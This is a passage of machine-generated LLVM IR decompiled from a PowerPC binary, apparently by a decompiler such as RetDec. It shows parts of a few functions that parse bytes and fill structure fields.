  br i1 %v3_1000d9a4, label %dec_label_pc_1000d9a0, label %dec_label_pc_1000d9ac

dec_label_pc_1000d9ac:                            ; preds = %dec_label_pc_1000d9a0
  %v0_1000d9ac = load i32, i32* %r6.global-to-local, align 4
  %v2_1000d9ac = sub i32 %v1_1000d9a0, %v0_1000d9ac
  %v1_1000d9b4 = mul i32 %v2_1000d9ac, 2
  store i32 %v1_1000d9b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100194bc.727 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d9bc = add i32 %v1_1000d9b4, ptrtoint (i32* @global_var_100194bc.727 to i32)
  %v3_1000d9bc = inttoptr i32 %v2_1000d9bc to i16*
  %v4_1000d9bc = load i16, i16* %v3_1000d9bc, align 2
  %v5_1000d9bc = sext i16 %v4_1000d9bc to i32
  store i32 %v5_1000d9bc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100194ac.728 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_100194d8.724 to i32), i32* @r7, align 4
  %v2_1000d9cc = add i32 %v1_1000d9b4, ptrtoint (i32* @global_var_100194ac.728 to i32)
  %v3_1000d9cc = inttoptr i32 %v2_1000d9cc to i16*
  %v4_1000d9cc = load i16, i16* %v3_1000d9cc, align 2
  %v5_1000d9cc = sext i16 %v4_1000d9cc to i32
  store i32 %v5_1000d9cc, i32* %r0.global-to-local, align 4
  %v2_1000d9d0 = or i32 %v5_1000d9bc, %v1_1000d950
  %v2_1000d9d4 = and i32 %v5_1000d9cc, %v2_1000d9d0
  store i32 %v2_1000d9d4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d9e8

dec_label_pc_1000d9dc:                            ; preds = %dec_label_pc_1000d978
  %v1_1000d9dc = add i32 %v1_1000d984, 1
  %v2_1000d9dc = inttoptr i32 %v1_1000d9dc to i8*
  %v3_1000d9dc = load i8, i8* %v2_1000d9dc, align 1
  %v4_1000d9dc = zext i8 %v3_1000d9dc to i32
  store i32 %v4_1000d9dc, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d9dc, i32* @r7, align 4
  %v3_1000d9e0 = icmp eq i8 %v3_1000d9dc, 0
  br i1 %v3_1000d9e0, label %dec_label_pc_1000d9e8, label %dec_label_pc_1000d978

dec_label_pc_1000d9e8:                            ; preds = %dec_label_pc_1000d9dc, %dec_label_pc_1000d9ac
  %v0_1000d9e8 = phi i32 [ %v2_1000d9d4, %dec_label_pc_1000d9ac ], [ %v3_1000d95c, %dec_label_pc_1000d9dc ]
  store i32 %v0_1000d9e8, i32* %stack_var_-96, align 4
  %v0_1000d9ec = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d9ec = call i32 @__asm_rlwinm(i32 %v0_1000d9ec, i32 30, i32 31, i32 31)
  %not.v2_1000d9f0 = icmp eq i32 %v1_1000d9ec, 0
  %v6_1000d9f4 = sext i1 %not.v2_1000d9f0 to i32
  store i32 %v6_1000d9f4, i32* %r9.global-to-local, align 4
  %v1_1000d9f8 = call i32 @__asm_rlwinm(i32 %v1_1000d950, i32 0, i32 20, i32 23)
  store i32 %v1_1000d9f8, i32* %r0.global-to-local, align 4
  %v0_1000d9fc = load i32, i32* @r30, align 4
  %v1_1000d9fc = inttoptr i32 %v0_1000d9fc to i8*
  %v2_1000d9fc = load i8, i8* %v1_1000d9fc, align 1
  %v3_1000d9fc = zext i8 %v2_1000d9fc to i32
  store i32 %v3_1000d9fc, i32* %r10.global-to-local, align 4
  %v1_1000da00 = call i32 @__asm_rlwinm(i32 %v6_1000d9f4, i32 0, i32 0, i32 27)
  store i32 %v1_1000da00, i32* %r9.global-to-local, align 4
  %v0_1000da04 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000da04 = call i32 @__asm_rlwinm(i32 %v0_1000da04, i32 0, i32 30, i32 28)
  %v1_1000da08 = add i32 %v1_1000da00, 48
  store i32 %v1_1000da08, i32* %r9.global-to-local, align 4
  %v2_1000da0c = or i32 %v1_1000da04, %v1_1000d9f8
  store i32 %v2_1000da0c, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  %v0_1000da14 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000da14 = load i32, i32* @r28, align 4
  %v2_1000da14 = add i32 %v1_1000da14, 12
  %v3_1000da14 = inttoptr i32 %v2_1000da14 to i32*
  store i32 %v0_1000da14, i32* %v3_1000da14, align 4
  %v0_1000da18 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000da18 = load i32, i32* @r28, align 4
  %v2_1000da18 = add i32 %v1_1000da18, 4
  %v3_1000da18 = inttoptr i32 %v2_1000da18 to i32*
  store i32 %v0_1000da18, i32* %v3_1000da18, align 4
  %v0_1000da1c = load i32, i32* @r31, align 4
  %v1_1000da1c = load i32, i32* @r28, align 4
  %v2_1000da1c = add i32 %v1_1000da1c, 8
  %v3_1000da1c = inttoptr i32 %v2_1000da1c to i32*
  store i32 %v0_1000da1c, i32* %v3_1000da1c, align 4
  %v0_1000da20 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000da20 = load i32, i32* @r28, align 4
  %v2_1000da20 = add i32 %v1_1000da20, 20
  %v3_1000da20 = inttoptr i32 %v2_1000da20 to i32*
  store i32 %v0_1000da20, i32* %v3_1000da20, align 4
  %v0_1000da24 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000da24 = load i32, i32* @r28, align 4
  %v2_1000da24 = add i32 %v1_1000da24, 16
  %v3_1000da24 = inttoptr i32 %v2_1000da24 to i32*
  store i32 %v0_1000da24, i32* %v3_1000da24, align 4
  %v0_1000da28 = load i32, i32* @r8, align 4
  %v1_1000da28 = load i32, i32* @r28, align 4
  %v2_1000da28 = add i32 %v1_1000da28, 28
  %v3_1000da28 = inttoptr i32 %v2_1000da28 to i32*
  store i32 %v0_1000da28, i32* %v3_1000da28, align 4
  %v0_1000da2c = load i32, i32* @r7, align 4
  %v1_1000da2c = inttoptr i32 %v0_1000da2c to i8*
  %v2_1000da2c = load i8, i8* %v1_1000da2c, align 1
  %v3_1000da2c = zext i8 %v2_1000da2c to i32
  store i32 %v3_1000da2c, i32* %r9.global-to-local, align 4
  %v3_1000da30 = icmp eq i8 %v2_1000da2c, 0
  br i1 %v3_1000da30, label %dec_label_pc_1000da38, label %dec_label_pc_1000da50

dec_label_pc_1000da38:                            ; preds = %dec_label_pc_1000d9e8
  %v0_1000da38 = load i32, i32* @r30, align 4
  %v1_1000da38 = inttoptr i32 %v0_1000da38 to i8*
  %v2_1000da38 = load i8, i8* %v1_1000da38, align 1
  %v3_1000da38 = zext i8 %v2_1000da38 to i32
  store i32 %v3_1000da38, i32* %r0.global-to-local, align 4
  %v3_1000da3c = icmp eq i8 %v2_1000da38, 109
  br i1 %v3_1000da3c, label %dec_label_pc_1000da44, label %dec_label_pc_1000db88

dec_label_pc_1000da44:                            ; preds = %dec_label_pc_1000da38
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000da48 = load i32, i32* @r28, align 4
  %v2_1000da48 = add i32 %v1_1000da48, 28
  %v3_1000da48 = inttoptr i32 %v2_1000da48 to i32*
  store i32 %v3_1000da2c, i32* %v3_1000da48, align 4
  %v0_1000da4c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000da4c = load i32, i32* @r28, align 4
  %v2_1000da4c = add i32 %v1_1000da4c, 32
  %v3_1000da4c = inttoptr i32 %v2_1000da4c to i32*
  store i32 %v0_1000da4c, i32* %v3_1000da4c, align 4
  br label %dec_label_pc_1000da50

dec_label_pc_1000da50:                            ; preds = %dec_label_pc_1000d9e8, %dec_label_pc_1000da44
  %v0_1000da50 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000da50, 1
  br i1 %tmp62, label %dec_label_pc_1000db2c, label %dec_label_pc_1000da58

dec_label_pc_1000da58:                            ; preds = %dec_label_pc_1000da50
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000da5c

dec_label_pc_1000da5c:                            ; preds = %dec_label_pc_1000db14, %dec_label_pc_1000da58
  %v0_1000da84 = phi i32 [ 0, %dec_label_pc_1000da58 ], [ %v1_1000db18, %dec_label_pc_1000db14 ]
  %v2_1000da5c = icmp sgt i32 %v0_1000da84, 2
  br i1 %v2_1000da5c, label %dec_label_pc_1000da80, label %dec_label_pc_1000da64

dec_label_pc_1000da64:                            ; preds = %dec_label_pc_1000da5c
  %v1_1000da64 = mul i32 %v0_1000da84, 4
  store i32 %v1_1000da64, i32* %r0.global-to-local, align 4
  %v0_1000da68 = load i32, i32* @r1, align 4
  %v2_1000da68 = add i32 %v0_1000da68, %v1_1000da64
  store i32 %v2_1000da68, i32* %r9.global-to-local, align 4
  %v1_1000da6c = add i32 %v2_1000da68, 20
  %v2_1000da6c = inttoptr i32 %v1_1000da6c to i32*
  %v3_1000da6c = load i32, i32* %v2_1000da6c, align 4
  store i32 %v3_1000da6c, i32* %r0.global-to-local, align 4
  %v1_1000da70 = load i32, i32* @r28, align 4
  %v2_1000da70 = add i32 %v1_1000da70, %v0_1000da84
  store i32 %v2_1000da70, i32* %r9.global-to-local, align 4
  %v1_1000da74 = urem i32 %v3_1000da6c, 256
  store i32 %v1_1000da74, i32* %r11.global-to-local, align 4
  %v1_1000da78 = trunc i32 %v3_1000da6c to i8
  %v3_1000da78 = add i32 %v2_1000da70, 36
  %v4_1000da78 = inttoptr i32 %v3_1000da78 to i8*
  store i8 %v1_1000da78, i8* %v4_1000da78, align 1
  %v0_1000da8c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000da8c

dec_label_pc_1000da80:                            ; preds = %dec_label_pc_1000da5c
  %v2_1000da84 = add i32 %v0_1000da84, %stack_var_-84.3
  store i32 %v2_1000da84, i32* %r9.global-to-local, align 4
  %v1_1000da88 = add i32 %v2_1000da84, -2
  store i32 %v1_1000da88, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000da8c

dec_label_pc_1000da8c:                            ; preds = %dec_label_pc_1000da64, %dec_label_pc_1000da80
  %v0_1000daac = phi i32 [ %v0_1000da8c.pre, %dec_label_pc_1000da64 ], [ %v1_1000da88, %dec_label_pc_1000da80 ]
  %v1_1000da8c = load i32, i32* @r26, align 4
  %v3_1000da8c = icmp sgt i32 %v0_1000daac, %v1_1000da8c
  br i1 %v3_1000da8c, label %dec_label_pc_1000da94, label %dec_label_pc_1000daa0

dec_label_pc_1000da94:                            ; preds = %dec_label_pc_1000da8c
  %v2_1000da94 = icmp sgt i32 %v0_1000daac, 9
  br i1 %v2_1000da94, label %dec_label_pc_1000db88, label %dec_label_pc_1000da9c

dec_label_pc_1000da9c:                            ; preds = %dec_label_pc_1000da94
  store i32 %v0_1000daac, i32* @r26, align 4
  br label %dec_label_pc_1000daa0

dec_label_pc_1000daa0:                            ; preds = %dec_label_pc_1000da8c, %dec_label_pc_1000da9c
  store i32 %v2_1000d73c.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000daa4 = load i32, i32* @r27, align 4
  %v1_1000daa4 = mul i32 %v0_1000daa4, 4
  store i32 %v1_1000daa4, i32* %r0.global-to-local, align 4
  %v2_1000daa8 = add i32 %v1_1000daa4, %v2_1000d73c.pre-phi
  %v3_1000daa8 = inttoptr i32 %v2_1000daa8 to i32*
  %v4_1000daa8 = load i32, i32* %v3_1000daa8, align 4
  store i32 %v4_1000daa8, i32* @r31, align 4
  %v1_1000daac = add i32 %v0_1000daac, -1
  store i32 %v1_1000daac, i32* @r25, align 4
  %v1_1000dab0 = mul i32 %v1_1000daac, 4
  %v1_1000dab4 = load i32, i32* @r28, align 4
  %v2_1000dab4 = add i32 %v1_1000dab4, %v1_1000dab0
  store i32 %v2_1000dab4, i32* %r9.global-to-local, align 4
  %v3_1000dab8 = icmp eq i32 %v4_1000daa8, 8
  %v1_1000dabc = add i32 %v2_1000dab4, 40
  %v2_1000dabc = inttoptr i32 %v1_1000dabc to i32*
  %v3_1000dabc = load i32, i32* %v2_1000dabc, align 4
  br i1 %v3_1000dab8, label %dec_label_pc_1000db14, label %dec_label_pc_1000dac4

dec_label_pc_1000dac4:                            ; preds = %dec_label_pc_1000daa0
  %v3_1000dac4 = icmp eq i32 %v3_1000dabc, 8
  br i1 %v3_1000dac4, label %dec_label_pc_1000dafc, label %dec_label_pc_1000dacc

dec_label_pc_1000dacc:                            ; preds = %dec_label_pc_1000dac4
  %v4_1000dacc = icmp eq i32 %v3_1000dabc, %v4_1000daa8
  br i1 %v4_1000dacc, label %dec_label_pc_1000dafc, label %dec_label_pc_1000dad4

dec_label_pc_1000dad4:                            ; preds = %dec_label_pc_1000dacc
  %v1_1000dad4 = call i32 @function_1000d644(i32 %v3_1000dabc)
  store i32 %v1_1000dad4, i32* @r29, align 4
  %v0_1000dadc = load i32, i32* @r31, align 4
  %v1_1000dae0 = call i32 @function_1000d644(i32 %v0_1000dadc)
  %v0_1000daec = call i32 @__asm_mfcr()
  store i32 %v0_1000daec, i32* %r0.global-to-local, align 4
  %v1_1000daf0 = call i32 @__asm_rlwinm(i32 %v0_1000daec, i32 31, i32 31, i32 31)
  store i32 %v1_1000daf0, i32* %r0.global-to-local, align 4
  %v3_1000daf4 = icmp eq i32 %v1_1000daf0, 0
  br i1 %v3_1000daf4, label %dec_label_pc_1000db14, label %dec_label_pc_1000dad4.dec_label_pc_1000dafc_crit_edge

dec_label_pc_1000dad4.dec_label_pc_1000dafc_crit_edge: ; preds = %dec_label_pc_1000dad4
  %v0_1000db00.pre = load i32, i32* @r27, align 4
  %v0_1000db08.pre = load i32, i32* @r25, align 4
  %v1_1000db0c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000dafc

dec_label_pc_1000dafc:                            ; preds = %dec_label_pc_1000dad4.dec_label_pc_1000dafc_crit_edge, %dec_label_pc_1000dacc, %dec_label_pc_1000dac4
  %v1_1000db0c = phi i32 [ %v1_1000db0c.pre, %dec_label_pc_1000dad4.dec_label_pc_1000dafc_crit_edge ], [ %v1_1000dab4, %dec_label_pc_1000dacc ], [ %v1_1000dab4, %dec_label_pc_1000dac4 ]
  %v0_1000db08 = phi i32 [ %v0_1000db08.pre, %dec_label_pc_1000dad4.dec_label_pc_1000dafc_crit_edge ], [ %v1_1000daac, %dec_label_pc_1000dacc ], [ %v1_1000daac, %dec_label_pc_1000dac4 ]
  %v0_1000db00 = phi i32 [ %v0_1000db00.pre, %dec_label_pc_1000dad4.dec_label_pc_1000dafc_crit_edge ], [ %v0_1000daa4, %dec_label_pc_1000dacc ], [ %v0_1000daa4, %dec_label_pc_1000dac4 ]
  store i32 %v2_1000d73c.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000db00 = mul i32 %v0_1000db00, 4
  store i32 %v1_1000db00, i32* %r0.global-to-local, align 4
  %v2_1000db04 = add i32 %v1_1000db00, %v2_1000d73c.pre-phi
  %v3_1000db04 = inttoptr i32 %v2_1000db04 to i32*
  %v4_1000db04 = load i32, i32* %v3_1000db04, align 4
  store i32 %v4_1000db04, i32* %r0.global-to-local, align 4
  %v1_1000db08 = mul i32 %v0_1000db08, 4
  %v2_1000db0c = add i32 %v1_1000db08, %v1_1000db0c
  store i32 %v2_1000db0c, i32* %r9.global-to-local, align 4
  %v2_1000db10 = add i32 %v2_1000db0c, 40
  %v3_1000db10 = inttoptr i32 %v2_1000db10 to i32*
  store i32 %v4_1000db04, i32* %v3_1000db10, align 4
  br label %dec_label_pc_1000db14

dec_label_pc_1000db14:                            ; preds = %dec_label_pc_1000dad4, %dec_label_pc_1000daa0, %dec_label_pc_1000dafc
  %v0_1000db14 = load i32, i32* @r28, align 4
  %v1_1000db14 = add i32 %v0_1000db14, 28
  %v2_1000db14 = inttoptr i32 %v1_1000db14 to i32*
  %v3_1000db14 = load i32, i32* %v2_1000db14, align 4
  %v0_1000db18 = load i32, i32* @r27, align 4
  %v1_1000db18 = add i32 %v0_1000db18, 1
  store i32 %v1_1000db18, i32* @r27, align 4
  %v1_1000db1c = add i32 %v3_1000db14, 2
  store i32 %v1_1000db1c, i32* %r9.global-to-local, align 4
  %v2_1000db20 = icmp slt i32 %v1_1000db18, %v1_1000db1c
  br i1 %v2_1000db20, label %dec_label_pc_1000da5c, label %dec_label_pc_1000db44

dec_label_pc_1000db2c:                            ; preds = %dec_label_pc_1000da50
  %v0_1000db2c = load i32, i32* @r28, align 4
  %v1_1000db2c = add i32 %v0_1000db2c, 28
  %v2_1000db2c = inttoptr i32 %v1_1000db2c to i32*
  %v3_1000db2c = load i32, i32* %v2_1000db2c, align 4
  store i32 %v3_1000db2c, i32* %r5.global-to-local, align 4
  %v1_1000db30 = add i32 %v0_1000db2c, 40
  store i32 %v1_1000db30, i32* @r3, align 4
  %v0_1000db34 = load i32, i32* @r8, align 4
  %v1_1000db34 = trunc i32 %v0_1000db34 to i8
  %v3_1000db34 = add i32 %v0_1000db2c, 38
  %v4_1000db34 = inttoptr i32 %v3_1000db34 to i8*
  store i8 %v1_1000db34, i8* %v4_1000db34, align 1
  %v2_1000db38 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000db38, i32* @r4, align 4
  %v0_1000db3c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000db3c = mul i32 %v0_1000db3c, 4
  store i32 %v1_1000db3c, i32* @r5, align 4
  store i32 268491588, i32* @lr, align 4
  %v0_1000db40 = call i32 @function_1000dcb0()
  %v0_1000db44.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000db44

dec_label_pc_1000db44:                            ; preds = %dec_label_pc_1000db14, %dec_label_pc_1000db2c
  %v0_1000db44 = phi i32 [ %v0_1000db44.pre, %dec_label_pc_1000db2c ], [ %v0_1000db14, %dec_label_pc_1000db14 ]
  %v1_1000db44 = add i32 %v0_1000db44, 16
  %v2_1000db44 = inttoptr i32 %v1_1000db44 to i32*
  %v3_1000db44 = load i32, i32* %v2_1000db44, align 4
  store i32 %v3_1000db44, i32* %r0.global-to-local, align 4
  %v0_1000db48 = load i32, i32* @r26, align 4
  %v2_1000db48 = add i32 %v0_1000db44, 24
  %v3_1000db48 = inttoptr i32 %v2_1000db48 to i32*
  store i32 %v0_1000db48, i32* %v3_1000db48, align 4
  %v0_1000db4c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000db4c = and i32 %v0_1000db4c, 128
  store i32 %v1_1000db4c, i32* %r9.global-to-local, align 4
  %v3_1000db4c = icmp eq i32 %v1_1000db4c, 0
  br i1 %v3_1000db4c, label %dec_label_pc_1000db54, label %dec_label_pc_1000db60

dec_label_pc_1000db54:                            ; preds = %dec_label_pc_1000db44
  %v0_1000db54 = load i32, i32* @r30, align 4
  %v1_1000db54 = add i32 %v0_1000db54, 1
  store i32 %v1_1000db54, i32* %r0.global-to-local, align 4
  %v1_1000db58 = load i32, i32* @r28, align 4
  %v2_1000db58 = inttoptr i32 %v1_1000db58 to i32*
  store i32 %v1_1000db54, i32* %v2_1000db58, align 4
  br label %dec_label_pc_1000db78

dec_label_pc_1000db60:                            ; preds = %dec_label_pc_1000db44
  %v0_1000db60 = load i32, i32* @r28, align 4
  %v1_1000db60 = inttoptr i32 %v0_1000db60 to i32*
  %v2_1000db60 = load i32, i32* %v1_1000db60, align 4
  %v2_1000db64 = ptrtoint i32* %stack_var_-80 to i32
  %v1_1000db68 = load i32, i32* @r30, align 4
  %v2_1000db68 = sub i32 %v1_1000db68, %v2_1000db64
  %v1_1000db6c = mul i32 %v2_1000db68, 4
  store i32 %v1_1000db6c, i32* %r0.global-to-local, align 4
  %v2_1000db70 = add i32 %v1_1000db6c, %v2_1000db60
  store i32 %v2_1000db70, i32* %r9.global-to-local, align 4
  store i32 %v2_1000db70, i32* %v1_1000db60, align 4
  br label %dec_label_pc_1000db78

dec_label_pc_1000db78:                            ; preds = %dec_label_pc_1000db54, %dec_label_pc_1000db60
  %v0_1000db78 = load i32, i32* @r28, align 4
  %v1_1000db78 = add i32 %v0_1000db78, 28
  %v2_1000db78 = inttoptr i32 %v1_1000db78 to i32*
  %v3_1000db78 = load i32, i32* %v2_1000db78, align 4
  store i32 %v3_1000db78, i32* %r9.global-to-local, align 4
  %v1_1000db7c = add i32 %v3_1000db78, 2
  br label %dec_label_pc_1000db88

dec_label_pc_1000db88:                            ; preds = %dec_label_pc_1000d6ec, %dec_label_pc_1000d7c0, %dec_label_pc_1000d89c, %dec_label_pc_1000d890, %dec_label_pc_1000d8b8, %dec_label_pc_1000d7f4, %dec_label_pc_1000da94, %dec_label_pc_1000d944, %dec_label_pc_1000da38, %dec_label_pc_1000db78
  %storemerge2 = phi i32 [ %v1_1000db7c, %dec_label_pc_1000db78 ], [ -1, %dec_label_pc_1000da38 ], [ -1, %dec_label_pc_1000d944 ], [ -1, %dec_label_pc_1000da94 ], [ -1, %dec_label_pc_1000d7f4 ], [ -1, %dec_label_pc_1000d8b8 ], [ -1, %dec_label_pc_1000d890 ], [ -1, %dec_label_pc_1000d89c ], [ -1, %dec_label_pc_1000d7c0 ], [ -1, %dec_label_pc_1000d6ec ]
  store i32 %v0_1000d688, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000db6c, { 1, 0 }
  uselistorder i32 %v0_1000db44, { 1, 0 }
  uselistorder i32 %v1_1000db18, { 1, 2, 0 }
  uselistorder i32 %v1_1000db00, { 1, 0 }
  uselistorder i32 %v3_1000dabc, { 0, 2, 1 }
  uselistorder i32 %v1_1000dab4, { 1, 2, 0 }
  uselistorder i32 %v1_1000daac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000daa4, { 1, 0 }
  uselistorder i32 %v0_1000daa4, { 1, 2, 0 }
  uselistorder i32 %v3_1000da6c, { 1, 0, 2 }
  uselistorder i32 %v1_1000da64, { 1, 0 }
  uselistorder i32 %v0_1000da84, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000d9dc, { 1, 2, 0 }
  uselistorder i32 %v1_1000d9b4, { 2, 1, 0 }
  uselistorder i32 %v1_1000d9a0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000d984, { 1, 0, 2 }
  uselistorder i32 %v1_1000d950, { 1, 3, 2, 0 }
  uselistorder i32 %v1_1000d90c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d8d0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000d8bc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000d82c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000d828, { 1, 0 }
  uselistorder i32 %v0_1000d840, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000d7a4, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000d794, { 1, 0 }
  uselistorder i32 %v1_1000d790, { 1, 0 }
  uselistorder i32 %v3_1000d784, { 1, 0, 2 }
  uselistorder i32 %v0_1000d800, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000d7d0, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_1000d760, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000d748, { 1, 0 }
  uselistorder i32 %v2_1000d73c.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000d71c, { 1, 0 }
  uselistorder i32 %v1_1000d704, { 1, 2, 0 }
  uselistorder i32 %v0_1000d6f8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32)* @function_1000d644, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_100194d8.724 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10019498.723 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000db88, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000db78, { 1, 0 }
  uselistorder label %dec_label_pc_1000db44, { 1, 0 }
  uselistorder label %dec_label_pc_1000db14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000daa0, { 1, 0 }
  uselistorder label %dec_label_pc_1000da8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000da50, { 1, 0 }
  uselistorder label %dec_label_pc_1000d998, { 1, 0 }
  uselistorder label %dec_label_pc_1000d944, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d8f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d8c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d87c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d878, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d784, { 1, 0 }
  uselistorder label %dec_label_pc_1000d780, { 1, 0 }
  uselistorder label %dec_label_pc_1000d76c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d74c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d748, { 1, 0 }
  uselistorder label %dec_label_pc_1000d72c, { 1, 0 }
}

define i32 @function_1000db9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000db9c:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000dbb4 = call i32 @function_1000df60()
  store i32 %v0_1000dbb4, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000dbd0.729 to i32), i32* @lr, align 4
  %v4_1000dbcc = inttoptr i32 %arg2 to i16*
  %v5_1000dbcc = call i32 @function_1000dbf8(i32 %arg1, i32 1, i32 %v0_1000dbb4, i16* %v4_1000dbcc)
  %v1_1000dbd4 = load i32, i32* @r27, align 4
  %v4_1000dbd4 = icmp eq i32 %v5_1000dbcc, %v1_1000dbd4
  br i1 %v4_1000dbd4, label %dec_label_pc_1000dbdc, label %dec_label_pc_1000dbe0

dec_label_pc_1000dbdc:                            ; preds = %dec_label_pc_1000db9c
  br label %dec_label_pc_1000dbe0

dec_label_pc_1000dbe0:                            ; preds = %dec_label_pc_1000db9c, %dec_label_pc_1000dbdc
  %v0_1000dbe0 = phi i32 [ -1, %dec_label_pc_1000db9c ], [ %v5_1000dbcc, %dec_label_pc_1000dbdc ]
  ret i32 %v0_1000dbe0

; uselistorder directives
  uselistorder label %dec_label_pc_1000dbe0, { 1, 0 }
}

define i32 @function_1000dbf8(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_1000dbf8:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v3_1000dc04 = load i16, i16* %arg4, align 2
  %v4_1000dc04 = zext i16 %v3_1000dc04 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000dc18 = call i32 @__asm_rlwinm(i32 %v4_1000dc04, i32 0, i32 24, i32 25)
  store i32 128, i32* @r4, align 4
  %v3_1000dc20 = icmp eq i32 %v1_1000dc18, 192
  store i32 %arg3, i32* @r31, align 4
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000dc20, label %dec_label_pc_1000dc3c, label %dec_label_pc_1000dc30

dec_label_pc_1000dc30:                            ; preds = %dec_label_pc_1000dbf8
  store i32 268491828, i32* @lr, align 4
  %v0_1000dc30 = call i32 @function_10010a4c()
  %v3_1000dc34 = icmp eq i32 %v0_1000dc30, 0
  br i1 %v3_1000dc34, label %dec_label_pc_1000dc30.dec_label_pc_1000dc3c_crit_edge, label %dec_label_pc_1000dc94

dec_label_pc_1000dc30.dec_label_pc_1000dc3c_crit_edge: ; preds = %dec_label_pc_1000dc30
  %v0_1000dc40.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000dc3c

dec_label_pc_1000dc3c:                            ; preds = %dec_label_pc_1000dc30.dec_label_pc_1000dc3c_crit_edge, %dec_label_pc_1000dbf8
  %v0_1000dc60 = phi i32 [ %v0_1000dc40.pre, %dec_label_pc_1000dc30.dec_label_pc_1000dc3c_crit_edge ], [ %arg3, %dec_label_pc_1000dbf8 ]
  %v0_1000dc3c = load i32, i32* @r29, align 4
  %v3_1000dc3c = icmp eq i32 %v0_1000dc3c, 0
  %v3_1000dc40 = icmp eq i32 %v0_1000dc60, 0
  %brmerge = or i1 %v3_1000dc40, %v3_1000dc3c
  br i1 %brmerge, label %dec_label_pc_1000dc94, label %dec_label_pc_1000dc4c

